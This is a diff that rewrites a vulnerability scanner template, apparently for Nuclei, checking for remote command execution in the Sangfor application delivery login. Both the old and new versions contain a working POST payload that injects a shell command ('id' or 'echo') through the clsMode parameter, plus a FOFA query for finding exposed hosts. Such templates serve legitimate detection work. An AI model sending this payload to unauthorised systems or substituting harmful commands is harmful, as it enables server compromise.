@@ -1,26 +1,33 @@
 id: sangfor-login-rce
 
 info:
-  name: 深信服 应用交付管理系统 login 远程命令执行漏洞
-  author: zan8in
-  severity: high
-  verified: true
+  name: Sangfor Application Login - Remote Command Execution
+  author: SleepingBag945
+  severity: critical
   description: |
-    深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令
-    FOFA: fid="iaytNA57019/kADk8Nev7g=="
+    Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands
   reference:
-    - https://peiqi.wgpsec.org/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20login%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
-  tags: sangfor,rce
-  created: 2023/08/09
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: fid="iaytNA57019/kADk8Nev7g=="
+  tags: sangfor,rce,vuln
 
-set:
-  r1: randomLowercase(30)
-rules:
-  r0:
-    request:
-      method: POST
-      path: /rep/login
-      body: |
-        clsMode=cls_mode_login%0Aecho+{{r1}}%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
-    expression: response.status == 200 && response.body.bcontains(bytes(r1)) && response.body.bcontains(b'cluster_mode_other')
-expression: r0()
+http:
+  - raw:
+      - |
+        POST /rep/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)", body)
+          - contains(body, "cluster_mode_others")
+        condition: and
+# digest: 4a0a00473045022100aaa336e5a0256947d273487d84028e98a558060a787906427d29010c3117e621022038443a491101f6b99eb53fc93fbffb04d7b869e85d1be44e92f336df0f4ac435:922c64590222798bb761d5b6d8e72950
